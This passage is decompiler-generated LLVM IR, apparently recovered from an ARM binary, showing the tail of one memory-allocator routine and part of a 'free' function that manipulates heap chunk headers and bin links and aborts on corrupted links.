  %v1_29a2c = load i32, i32* %r2.global-to-local, align 4
  %v2_29a2c = add i32 %v1_29a2c, 12
  %v3_29a2c = inttoptr i32 %v2_29a2c to i32*
  store i32 %v0_29a2c, i32* %v3_29a2c, align 4
  %v0_29a30 = load i32, i32* %lr.global-to-local, align 4
  %v1_29a30 = load i32, i32* %r1.global-to-local, align 4
  %v3_29a30 = add i32 %v1_29a30, %v0_29a30
  %v4_29a30 = inttoptr i32 %v3_29a30 to i32*
  store i32 %v0_29a30, i32* %v4_29a30, align 4
  %v0_29a34 = load i32, i32* %r3.global-to-local, align 4
  %v1_29a34 = load i32, i32* %r1.global-to-local, align 4
  %v2_29a34 = add i32 %v1_29a34, 4
  %v3_29a34 = inttoptr i32 %v2_29a34 to i32*
  store i32 %v0_29a34, i32* %v3_29a34, align 4
  %v0_29a38 = load i32, i32* %r2.global-to-local, align 4
  %v1_29a38 = load i32, i32* %r1.global-to-local, align 4
  %v2_29a38 = add i32 %v1_29a38, 8
  %v3_29a38 = inttoptr i32 %v2_29a38 to i32*
  store i32 %v0_29a38, i32* %v3_29a38, align 4
  %v0_29a3c = load i32, i32* %r7.global-to-local, align 4
  %v1_29a3c = load i32, i32* %r1.global-to-local, align 4
  %v2_29a3c = add i32 %v1_29a3c, 12
  %v3_29a3c = inttoptr i32 %v2_29a3c to i32*
  store i32 %v0_29a3c, i32* %v3_29a3c, align 4
  br label %dec_label_pc_29a54

dec_label_pc_29a44:                               ; preds = %dec_label_pc_299cc
  %v2_29a44 = add i32 %v1_299d4, %v0_29a44
  %v1_29a48 = or i32 %v2_29a44, 1
  store i32 %v1_29a48, i32* %r3.global-to-local, align 4
  %v1_29a4c = load i32, i32* %r1.global-to-local, align 4
  %v2_29a4c = add i32 %v1_29a4c, 4
  %v3_29a4c = inttoptr i32 %v2_29a4c to i32*
  store i32 %v1_29a48, i32* %v3_29a4c, align 4
  %v0_29a50 = load i32, i32* %r1.global-to-local, align 4
  %v1_29a50 = load i32, i32* @r4, align 4
  %v2_29a50 = add i32 %v1_29a50, 44
  %v3_29a50 = inttoptr i32 %v2_29a50 to i32*
  store i32 %v0_29a50, i32* %v3_29a50, align 4
  br label %dec_label_pc_29a54

dec_label_pc_29a54:                               ; preds = %dec_label_pc_29a20, %dec_label_pc_29a44
  %v0_29a54 = load i32, i32* %sl.global-to-local, align 4
  %v2_29a54 = icmp eq i32 %v0_29a54, 0
  store i32 %v0_29a54, i32* %r1.global-to-local, align 4
  br i1 %v2_29a54, label %dec_label_pc_29a60.loopexit, label %dec_label_pc_2997c

dec_label_pc_29a60.loopexit:                      ; preds = %dec_label_pc_29a54
  %v0_29a60.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_29a60.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_29a60

dec_label_pc_29a60:                               ; preds = %dec_label_pc_29a60.loopexit, %dec_label_pc_2996c
  %v1_29a60 = phi i32 [ %v1_29a60.pre, %dec_label_pc_29a60.loopexit ], [ %v1_29a6010, %dec_label_pc_2996c ]
  %v0_29a68 = phi i32 [ %v0_29a60.pre, %dec_label_pc_29a60.loopexit ], [ %v1_29978, %dec_label_pc_2996c ]
  %v9_29a60 = icmp eq i32 %v0_29a68, %v1_29a60
  br i1 %v9_29a60, label %dec_label_pc_29ad8, label %dec_label_pc_29a68

dec_label_pc_29a68:                               ; preds = %dec_label_pc_29a60
  %v1_29a68 = add i32 %v0_29a68, 4
  store i32 %v1_29a68, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2996c

dec_label_pc_29a70.dec_label_pc_29a70_crit_edge:  ; preds = %dec_label_pc_29a70.preheader, %dec_label_pc_29a70.dec_label_pc_29a70_crit_edge
  %v0_29a70.pre = load i32, i32* @r4, align 4
  %v1_29a70.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_29a70 = mul i32 %v1_29a70.pre, 8
  %v5_29a70 = add i32 %v4_29a70, %v0_29a70.pre
  %v1_29a74 = add i32 %v1_29a70.pre, 1
  store i32 %v1_29a74, i32* %r2.global-to-local, align 4
  %v1_29a78 = add i32 %v5_29a70, 44
  store i32 %v1_29a78, i32* %r3.global-to-local, align 4
  %v2_29a80 = add i32 %v5_29a70, 52
  %v3_29a80 = inttoptr i32 %v2_29a80 to i32*
  store i32 %v1_29a78, i32* %v3_29a80, align 4
  %v0_29a84 = load i32, i32* %r3.global-to-local, align 4
  %v2_29a84 = add i32 %v0_29a84, 12
  %v3_29a84 = inttoptr i32 %v2_29a84 to i32*
  store i32 %v0_29a84, i32* %v3_29a84, align 4
  %v7_29a88 = icmp sgt i32 %v1_29a74, 95
  br i1 %v7_29a88, label %dec_label_pc_29a8c, label %dec_label_pc_29a70.dec_label_pc_29a70_crit_edge

dec_label_pc_29a8c:                               ; preds = %dec_label_pc_29a70.dec_label_pc_29a70_crit_edge
  %v0_29a8c = load i32, i32* @r4, align 4
  %v1_29a8c = inttoptr i32 %v0_29a8c to i32*
  %v2_29a8c = load i32, i32* %v1_29a8c, align 4
  store i32 %v2_29a8c, i32* %r2.global-to-local, align 4
  %v1_29a90 = add i32 %v0_29a8c, 864
  %v2_29a90 = inttoptr i32 %v1_29a90 to i32*
  %v3_29a90 = load i32, i32* %v2_29a90, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_29a98 = urem i32 %v2_29a8c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_29aa0 = or i32 %v3_29a90, 1
  store i32 %v1_29aa0, i32* %r1.global-to-local, align 4
  %v1_29aa4 = or i32 %v1_29a98, 72
  store i32 %v1_29aa4, i32* %r2.global-to-local, align 4
  %v1_29aa8 = add i32 %v0_29a8c, 52
  store i32 %v1_29aa8, i32* @ip, align 4
  %v2_29aac = add i32 %v0_29a8c, 840
  %v3_29aac = inttoptr i32 %v2_29aac to i32*
  store i32 0, i32* %v3_29aac, align 4
  %v0_29ab0 = load i32, i32* %r3.global-to-local, align 4
  %v1_29ab0 = add i32 %v0_29ab0, 65536
  store i32 %v1_29ab0, i32* %r3.global-to-local, align 4
  %v0_29ab4 = load i32, i32* %r0.global-to-local, align 4
  %v1_29ab4 = load i32, i32* @r4, align 4
  %v2_29ab4 = add i32 %v1_29ab4, 836
  %v3_29ab4 = inttoptr i32 %v2_29ab4 to i32*
  store i32 %v0_29ab4, i32* %v3_29ab4, align 4
  %v0_29ab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_29ab8 = load i32, i32* @r4, align 4
  %v2_29ab8 = add i32 %v1_29ab8, 844
  %v3_29ab8 = inttoptr i32 %v2_29ab8 to i32*
  store i32 %v0_29ab8, i32* %v3_29ab8, align 4
  %v0_29abc = load i32, i32* %r3.global-to-local, align 4
  %v1_29abc = load i32, i32* @r4, align 4
  %v2_29abc = add i32 %v1_29abc, 852
  %v3_29abc = inttoptr i32 %v2_29abc to i32*
  store i32 %v0_29abc, i32* %v3_29abc, align 4
  %v0_29ac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_29ac0 = load i32, i32* @r4, align 4
  %v2_29ac0 = add i32 %v1_29ac0, 864
  %v3_29ac0 = inttoptr i32 %v2_29ac0 to i32*
  store i32 %v0_29ac0, i32* %v3_29ac0, align 4
  %v0_29ac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_29ac4 = load i32, i32* @r4, align 4
  %v2_29ac4 = inttoptr i32 %v1_29ac4 to i32*
  store i32 %v0_29ac4, i32* %v2_29ac4, align 4
  %v0_29ac8 = load i32, i32* @ip, align 4
  %v1_29ac8 = load i32, i32* @r4, align 4
  %v2_29ac8 = add i32 %v1_29ac8, 44
  %v3_29ac8 = inttoptr i32 %v2_29ac8 to i32*
  store i32 %v0_29ac8, i32* %v3_29ac8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_29ad0 = call i32 @sysconf(i32 30)
  store i32 %v4_29ad0, i32* @r0, align 4
  %v1_29ad4 = load i32, i32* @r4, align 4
  %v2_29ad4 = add i32 %v1_29ad4, 860
  %v3_29ad4 = inttoptr i32 %v2_29ad4 to i32*
  store i32 %v4_29ad0, i32* %v3_29ad4, align 4
  br label %dec_label_pc_29ad8

dec_label_pc_29ad8:                               ; preds = %dec_label_pc_29a60, %dec_label_pc_29a8c
  %v2_29adc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_29adc, i32* @r4, align 4
  %v1_29ae0 = load i32, i32* @r0, align 4
  ret i32 %v1_29ae0

; uselistorder directives
  uselistorder i32 %v0_29a8c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_29a84, { 1, 0 }
  uselistorder i32 %v1_29a68, { 1, 0 }
  uselistorder i32 %v0_29a54, { 0, 2, 1 }
  uselistorder i32 %v0_29a30, { 1, 0 }
  uselistorder i32 %v1_29980, { 1, 0, 2 }
  uselistorder i32 %v0_29998, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_29958, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 20 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 3, 4, 13 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @sysconf, { 0, 2, 1 }
  uselistorder i32 30, { 1, 2, 0 }
  uselistorder i32 852, { 1, 0 }
  uselistorder i32 844, { 1, 0 }
  uselistorder i32 864, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 95, { 1, 0 }
  uselistorder label %dec_label_pc_29ad8, { 1, 0 }
  uselistorder label %dec_label_pc_29a70.dec_label_pc_29a70_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_29a54, { 1, 0 }
  uselistorder label %dec_label_pc_29a20, { 1, 0 }
  uselistorder label %dec_label_pc_29a14, { 1, 0 }
  uselistorder label %dec_label_pc_29a10, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_299cc, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_29ae4 = load i32, i32* @r4, align 4
  %v6_29ae4 = load i32, i32* @r5, align 4
  %v9_29ae4 = load i32, i32* @r6, align 4
  %v12_29ae4 = load i32, i32* @r7, align 4
  %v18_29ae4 = load i32, i32* @lr, align 4
  %v0_29aec = load i32, i32* @r0, align 4
  store i32 %v0_29aec, i32* @r6, align 4
  %v2_29aec = icmp eq i32 %v0_29aec, 0
  %v2_29af0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  br i1 %v2_29aec, label %dec_label_pc_29cf8, label %dec_label_pc_29afc

dec_label_pc_29afc:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_29b00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 156) to i32*), align 4
  store i32 %v4_29b00, i32* %r4.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %v4_29b00, i32* %r2.global-to-local, align 4
  %v4_29b0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  store i32 %v4_29b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_29af0, i32* %r0.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_29b18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_29b18, i32* %ip.global-to-local, align 4
  store i32 170788, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_29b18)
  %v0_29b24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_29b24, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_29b2c = load i32, i32* @r7, align 4
  %v2_29b2c = add i32 %v0_29b2c, 36
  %v3_29b2c = inttoptr i32 %v2_29b2c to i32*
  %v4_29b2c = load i32, i32* %v3_29b2c, align 4
  store i32 %v4_29b2c, i32* %ip.global-to-local, align 4
  store i32 170808, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_29b2c)
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_29b3c = load i32, i32* @r7, align 4
  %v2_29b3c = add i32 %v0_29b3c, 92
  %v3_29b3c = inttoptr i32 %v2_29b3c to i32*
  %v4_29b3c = load i32, i32* %v3_29b3c, align 4
  store i32 %v4_29b3c, i32* @lr, align 4
  %v0_29b40 = load i32, i32* @r6, align 4
  %v1_29b40 = add i32 %v0_29b40, -4
  %v2_29b40 = inttoptr i32 %v1_29b40 to i32*
  %v3_29b40 = load i32, i32* %v2_29b40, align 4
  store i32 %v3_29b40, i32* %r2.global-to-local, align 4
  %v1_29b44 = inttoptr i32 %v4_29b3c to i32*
  %v2_29b44 = load i32, i32* %v1_29b44, align 4
  store i32 %v2_29b44, i32* %r3.global-to-local, align 4
  %v1_29b48 = and i32 %v3_29b40, -4
  store i32 %v1_29b48, i32* %ip.global-to-local, align 4
  %v1_29b4c = add i32 %v0_29b40, -8
  store i32 %v1_29b4c, i32* @r5, align 4
  store i32 %v1_29b4c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_29b48, %v2_29b44
  br i1 %tmp, label %dec_label_pc_29b7c, label %dec_label_pc_29b5c

dec_label_pc_29b5c:                               ; preds = %dec_label_pc_29afc
  %v1_29b5c = or i32 %v2_29b44, 3
  store i32 %v1_29b5c, i32* %r3.global-to-local, align 4
  store i32 %v1_29b5c, i32* %v1_29b44, align 4
  %v3_29b60 = load i32, i32* @lr, align 4
  %v4_29b60 = add i32 %v3_29b60, -8
  store i32 %v4_29b60, i32* %lr.global-to-local, align 4
  %v0_29b64 = load i32, i32* %ip.global-to-local, align 4
  %v3_29b64 = udiv i32 %v0_29b64, 8
  store i32 %v3_29b64, i32* %r1.global-to-local, align 4
  %v1_29b68 = add i32 %v3_29b60, -4
  store i32 %v1_29b68, i32* %r2.global-to-local, align 4
  %v4_29b6c = mul nuw i32 %v3_29b64, 4
  %v5_29b6c = add i32 %v4_29b6c, %v1_29b68
  %v6_29b6c = inttoptr i32 %v5_29b6c to i32*
  %v7_29b6c = load i32, i32* %v6_29b6c, align 4
  store i32 %v7_29b6c, i32* %r3.global-to-local, align 4
  %v1_29b70 = load i32, i32* @r5, align 4
  %v2_29b70 = add i32 %v1_29b70, 8
  %v3_29b70 = inttoptr i32 %v2_29b70 to i32*
  store i32 %v7_29b6c, i32* %v3_29b70, align 4
  %v0_29b74 = load i32, i32* @r5, align 4
  %v1_29b74 = load i32, i32* %r2.global-to-local, align 4
  %v2_29b74 = load i32, i32* %r1.global-to-local, align 4
  %v5_29b74 = mul i32 %v2_29b74, 4
  %v6_29b74 = add i32 %v5_29b74, %v1_29b74
  %v7_29b74 = inttoptr i32 %v6_29b74 to i32*
  store i32 %v0_29b74, i32* %v7_29b74, align 4
  br label %dec_label_pc_29ce0

dec_label_pc_29b7c:                               ; preds = %dec_label_pc_29afc
  %v1_29b7c = and i32 %v3_29b40, 2
  %v2_29b7c = icmp eq i32 %v1_29b7c, 0
  br i1 %v2_29b7c, label %dec_label_pc_29b84, label %dec_label_pc_29cb8

dec_label_pc_29b84:                               ; preds = %dec_label_pc_29b7c
  %v1_29b84 = or i32 %v2_29b44, 1
  store i32 %v1_29b84, i32* %r3.global-to-local, align 4
  store i32 %v1_29b84, i32* %v1_29b44, align 4
  %v0_29b8c = load i32, i32* @r6, align 4
  %v1_29b8c = add i32 %v0_29b8c, -4
  %v2_29b8c = inttoptr i32 %v1_29b8c to i32*
  %v3_29b8c = load i32, i32* %v2_29b8c, align 4
  store i32 %v3_29b8c, i32* %r3.global-to-local, align 4
  %v0_29b90 = load i32, i32* @r5, align 4
  %v1_29b90 = load i32, i32* %ip.global-to-local, align 4
  %v2_29b90 = add i32 %v1_29b90, %v0_29b90
  store i32 %v2_29b90, i32* %lr.global-to-local, align 4
  %v1_29b94 = urem i32 %v3_29b8c, 2
  %v2_29b94 = icmp eq i32 %v1_29b94, 0
  %v1_29b98 = add i32 %v2_29b90, 4
  %v2_29b98 = inttoptr i32 %v1_29b98 to i32*
  %v3_29b98 = load i32, i32* %v2_29b98, align 4
  store i32 %v3_29b98, i32* %r8.global-to-local, align 4
  br i1 %v2_29b94, label %dec_label_pc_29ba0, label %dec_label_pc_29bd4

dec_label_pc_29ba0:                               ; preds = %dec_label_pc_29b84
  %v1_29ba0 = add i32 %v0_29b8c, -8
  %v2_29ba0 = inttoptr i32 %v1_29ba0 to i32*
  %v3_29ba0 = load i32, i32* %v2_29ba0, align 4
  store i32 %v3_29ba0, i32* %r1.global-to-local, align 4
  %v2_29ba4 = sub i32 %v0_29b90, %v3_29ba0
  store i32 %v2_29ba4, i32* %r3.global-to-local, align 4
  %v1_29ba8 = add i32 %v2_29ba4, 8
  %v2_29ba8 = inttoptr i32 %v1_29ba8 to i32*
  %v3_29ba8 = load i32, i32* %v2_29ba8, align 4
  store i32 %v3_29ba8, i32* %r2.global-to-local, align 4
  %v1_29bac = add i32 %v3_29ba8, 12
  %v2_29bac = inttoptr i32 %v1_29bac to i32*
  %v3_29bac = load i32, i32* %v2_29bac, align 4
  store i32 %v3_29bac, i32* %r4.global-to-local, align 4
  %v9_29bb0 = icmp eq i32 %v3_29bac, %v2_29ba4
  %v1_29bb4 = add i32 %v2_29ba4, 12
  %v2_29bb4 = inttoptr i32 %v1_29bb4 to i32*
  %v3_29bb4 = load i32, i32* %v2_29bb4, align 4
  store i32 %v3_29bb4, i32* %r0.global-to-local, align 4
  br i1 %v9_29bb0, label %dec_label_pc_29bbc, label %dec_label_pc_29c20

dec_label_pc_29bbc:                               ; preds = %dec_label_pc_29ba0
  %v1_29bbc = add i32 %v3_29bb4, 8
  %v2_29bbc = inttoptr i32 %v1_29bbc to i32*
  %v3_29bbc = load i32, i32* %v2_29bbc, align 4
  store i32 %v3_29bbc, i32* %r3.global-to-local, align 4
  %v9_29bc0 = icmp eq i32 %v3_29bbc, %v2_29ba4
  br i1 %v9_29bc0, label %dec_label_pc_29bc8, label %dec_label_pc_29c20

dec_label_pc_29bc8:                               ; preds = %dec_label_pc_29bbc
  store i32 %v3_29ba8, i32* %v2_29bbc, align 4
  %v0_29bcc = load i32, i32* %r0.global-to-local, align 4
  %v1_29bcc = load i32, i32* %r2.global-to-local, align 4
  %v2_29bcc = add i32 %v1_29bcc, 12
  %v3_29bcc = inttoptr i32 %v2_29bcc to i32*
  store i32 %v0_29bcc, i32* %v3_29bcc, align 4
  %v0_29bd0 = load i32, i32* %ip.global-to-local, align 4
  %v1_29bd0 = load i32, i32* %r1.global-to-local, align 4
  %v2_29bd0 = add i32 %v1_29bd0, %v0_29bd0
  store i32 %v2_29bd0, i32* %ip.global-to-local, align 4
  %v0_29be0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_29be4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_29bd4

dec_label_pc_29bd4:                               ; preds = %dec_label_pc_29b84, %dec_label_pc_29bc8
  %v0_29c60 = phi i32 [ %v1_29b90, %dec_label_pc_29b84 ], [ %v2_29bd0, %dec_label_pc_29bc8 ]
  %v0_29be4 = phi i32 [ %v3_29b98, %dec_label_pc_29b84 ], [ %v0_29be4.pre, %dec_label_pc_29bc8 ]
  %v1_29bf8 = phi i32 [ %v2_29b90, %dec_label_pc_29b84 ], [ %v0_29be0.pre, %dec_label_pc_29bc8 ]
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_29bd8 = load i32, i32* @r7, align 4
  %v2_29bd8 = add i32 %v0_29bd8, 92
  %v3_29bd8 = inttoptr i32 %v2_29bd8 to i32*
  %v4_29bd8 = load i32, i32* %v3_29bd8, align 4
  store i32 %v4_29bd8, i32* %r2.global-to-local, align 4
  %v1_29bdc = add i32 %v4_29bd8, 44
  %v2_29bdc = inttoptr i32 %v1_29bdc to i32*
  %v3_29bdc = load i32, i32* %v2_29bdc, align 4
  store i32 %v3_29bdc, i32* %r3.global-to-local, align 4
  %v9_29be0 = icmp eq i32 %v1_29bf8, %v3_29bdc
  %v1_29be4 = and i32 %v0_29be4, -4
  store i32 %v1_29be4, i32* %r0.global-to-local, align 4
  br i1 %v9_29be0, label %dec_label_pc_29c60, label %dec_label_pc_29bec

dec_label_pc_29bec:                               ; preds = %dec_label_pc_29bd4
  %v2_29bec = add i32 %v1_29bf8, %v1_29be4
  store i32 %v2_29bec, i32* %r3.global-to-local, align 4
  %v1_29bf0 = add i32 %v2_29bec, 4
  %v2_29bf0 = inttoptr i32 %v1_29bf0 to i32*
  %v3_29bf0 = load i32, i32* %v2_29bf0, align 4
  store i32 %v3_29bf0, i32* %r3.global-to-local, align 4
  %v1_29bf4 = urem i32 %v3_29bf0, 2
  %v2_29bf4 = icmp eq i32 %v1_29bf4, 0
  %v2_29bf8 = add i32 %v1_29bf8, 4
  %v3_29bf8 = inttoptr i32 %v2_29bf8 to i32*
  store i32 %v1_29be4, i32* %v3_29bf8, align 4
  br i1 %v2_29bf4, label %dec_label_pc_29c00, label %dec_label_pc_29bec.dec_label_pc_29c30_crit_edge

dec_label_pc_29bec.dec_label_pc_29c30_crit_edge:  ; preds = %dec_label_pc_29bec
  %v0_29c40.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_29c30

dec_label_pc_29c00:                               ; preds = %dec_label_pc_29bec
  %v0_29c00 = load i32, i32* %lr.global-to-local, align 4
  %v1_29c00 = add i32 %v0_29c00, 8
  %v2_29c00 = inttoptr i32 %v1_29c00 to i32*
  %v3_29c00 = load i32, i32* %v2_29c00, align 4
  store i32 %v3_29c00, i32* %r1.global-to-local, align 4
  %v1_29c04 = add i32 %v3_29c00, 12
  %v2_29c04 = inttoptr i32 %v1_29c04 to i32*
  %v3_29c04 = load i32, i32* %v2_29c04, align 4
  store i32 %v3_29c04, i32* %r3.global-to-local, align 4
  %v9_29c08 = icmp eq i32 %v3_29c04, %v0_29c00
  %v1_29c0c = add i32 %v0_29c00, 12
  %v2_29c0c = inttoptr i32 %v1_29c0c to i32*
  %v3_29c0c = load i32, i32* %v2_29c0c, align 4
  store i32 %v3_29c0c, i32* %r2.global-to-local, align 4
  br i1 %v9_29c08, label %dec_label_pc_29c14, label %dec_label_pc_29c20

dec_label_pc_29c14:                               ; preds = %dec_label_pc_29c00
  %v1_29c14 = add i32 %v3_29c0c, 8
  %v2_29c14 = inttoptr i32 %v1_29c14 to i32*
  %v3_29c14 = load i32, i32* %v2_29c14, align 4
  store i32 %v3_29c14, i32* %r3.global-to-local, align 4
  %v9_29c18 = icmp eq i32 %v3_29c14, %v0_29c00
  br i1 %v9_29c18, label %dec_label_pc_29c24, label %dec_label_pc_29c20

dec_label_pc_29c20:                               ; preds = %dec_label_pc_29c00, %dec_label_pc_29bbc, %dec_label_pc_29ba0, %dec_label_pc_29c14
  %v0_29c20 = call i32 @abort()
  store i32 %v0_29c20, i32* %r0.global-to-local, align 4
  %v0_29c24.pre = load i32, i32* @r1, align 4
  %v1_29c24.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_29c24

dec_label_pc_29c24:                               ; preds = %dec_label_pc_29c14, %dec_label_pc_29c20
  %v1_29c24 = phi i32 [ %v3_29c0c, %dec_label_pc_29c14 ], [ %v1_29c24.pre, %dec_label_pc_29c20 ]
  %v0_29c24 = phi i32 [ %v3_29c00, %dec_label_pc_29c14 ], [ %v0_29c24.pre, %dec_label_pc_29c20 ]
  %v2_29c24 = add i32 %v1_29c24, 8
  %v3_29c24 = inttoptr i32 %v2_29c24 to i32*
  store i32 %v0_29c24, i32* %v3_29c24, align 4
  %v0_29c28 = load i32, i32* %r2.global-to-local, align 4
  %v1_29c28 = load i32, i32* %r1.global-to-local, align 4
  %v2_29c28 = add i32 %v1_29c28, 12
  %v3_29c28 = inttoptr i32 %v2_29c28 to i32*
  store i32 %v0_29c28, i32* %v3_29c28, align 4
  %v0_29c2c = load i32, i32* %ip.global-to-local, align 4
  %v1_29c2c = load i32, i32* %r0.global-to-local, align 4
  %v2_29c2c = add i32 %v1_29c2c, %v0_29c2c
  store i32 %v2_29c2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_29c30

dec_label_pc_29c30:                               ; preds = %dec_label_pc_29bec.dec_label_pc_29c30_crit_edge, %dec_label_pc_29c24
  %v0_29c40 = phi i32 [ %v0_29c40.pre, %dec_label_pc_29bec.dec_label_pc_29c30_crit_edge ], [ %v2_29c2c, %dec_label_pc_29c24 ]
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_29c34 = load i32, i32* @r7, align 4
  %v2_29c34 = add i32 %v0_29c34, 92
  %v3_29c34 = inttoptr i32 %v2_29c34 to i32*
  %v4_29c34 = load i32, i32* %v3_29c34, align 4
  %v1_29c38 = add i32 %v4_29c34, 52
  store i32 %v1_29c38, i32* %r3.global-to-local, align 4
  %v1_29c3c = add i32 %v4_29c34, 60
  %v2_29c3c = inttoptr i32 %v1_29c3c to i32*
  %v3_29c3c = load i32, i32* %v2_29c3c, align 4
  store i32 %v3_29c3c, i32* %r1.global-to-local, align 4
  %v1_29c40 = or i32 %v0_29c40, 1
  store i32 %v1_29c40, i32* %r2.global-to-local, align 4
  %v1_29c44 = load i32, i32* %r4.global-to-local, align 4
  %v2_29c44 = add i32 %v1_29c44, 12
  %v3_29c44 = inttoptr i32 %v2_29c44 to i32*
  store i32 %v1_29c38, i32* %v3_29c44, align 4
  %v0_29c48 = load i32, i32* %r1.global-to-local, align 4
  %v1_29c48 = load i32, i32* %r4.global-to-local, align 4
  %v2_29c48 = add i32 %v1_29c48, 8
  %v3_29c48 = inttoptr i32 %v2_29c48 to i32*
  store i32 %v0_29c48, i32* %v3_29c48, align 4
  %v0_29c4c = load i32, i32* %r2.global-to-local, align 4
  %v1_29c4c = load i32, i32* %r4.global-to-local, align 4
  %v2_29c4c = add i32 %v1_29c4c, 4
  %v3_29c4c = inttoptr i32 %v2_29c4c to i32*
  store i32 %v0_29c4c, i32* %v3_29c4c, align 4
  %v0_29c50 = load i32, i32* %ip.global-to-local, align 4
  %v1_29c50 = load i32, i32* %r4.global-to-local, align 4
  %v3_29c50 = add i32 %v1_29c50, %v0_29c50
  %v4_29c50 = inttoptr i32 %v3_29c50 to i32*
  store i32 %v0_29c50, i32* %v4_29c50, align 4
  %v0_29c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_29c54 = load i32, i32* %r1.global-to-local, align 4
  %v2_29c54 = add i32 %v1_29c54, 12
  %v3_29c54 = inttoptr i32 %v2_29c54 to i32*
  store i32 %v0_29c54, i32* %v3_29c54, align 4
  %v0_29c58 = load i32, i32* %r4.global-to-local, align 4
  %v1_29c58 = load i32, i32* %r3.global-to-local, align 4
  %v2_29c58 = add i32 %v1_29c58, 8
  %v3_29c58 = inttoptr i32 %v2_29c58 to i32*
  store i32 %v0_29c58, i32* %v3_29c58, align 4
  br label %dec_label_pc_29c70

dec_label_pc_29c60:                               ; preds = %dec_label_pc_29bd4
  %v2_29c60 = add i32 %v1_29be4, %v0_29c60
  store i32 %v2_29c60, i32* %ip.global-to-local, align 4
  %v1_29c64 = or i32 %v2_29c60, 1
  store i32 %v1_29c64, i32* %r3.global-to-local, align 4
  %v0_29c68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_29c68, i32* %v2_29bdc, align 4
  %v0_29c6c = load i32, i32* %r3.global-to-local, align 4
  %v1_29c6c = load i32, i32* %r4.global-to-local, align 4
  %v2_29c6c = add i32 %v1_29c6c, 4
  %v3_29c6c = inttoptr i32 %v2_29c6c to i32*
  store i32 %v0_29c6c, i32* %v3_29c6c, align 4
  br label %dec_label_pc_29c70

dec_label_pc_29c70:                               ; preds = %dec_label_pc_29c30, %dec_label_pc_29c60
  %v0_29c70 = load i32, i32* %ip.global-to-local, align 4
  %v3_29c74 = icmp ult i32 %v0_29c70, 131070
  br i1 %v3_29c74, label %dec_label_pc_29ce0, label %dec_label_pc_29c78

dec_label_pc_29c78:                               ; preds = %dec_label_pc_29c70
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_29c7c = load i32, i32* @r7, align 4
  %v2_29c7c = add i32 %v0_29c7c, 92
  %v3_29c7c = inttoptr i32 %v2_29c7c to i32*
  %v4_29c7c = load i32, i32* %v3_29c7c, align 4
  store i32 %v4_29c7c, i32* @r4, align 4
  %v1_29c80 = inttoptr i32 %v4_29c7c to i32*
  %v2_29c80 = load i32, i32* %v1_29c80, align 4
  store i32 %v2_29c80, i32* %r3.global-to-local, align 4
  %v1_29c84 = and i32 %v2_29c80, 2
  %v2_29c84 = icmp eq i32 %v1_29c84, 0
  br i1 %v2_29c84, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_29c78
  store i32 %v4_29c7c, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_29c78, %bb
  %v1_29c8c = xor i1 %v2_29c84, true
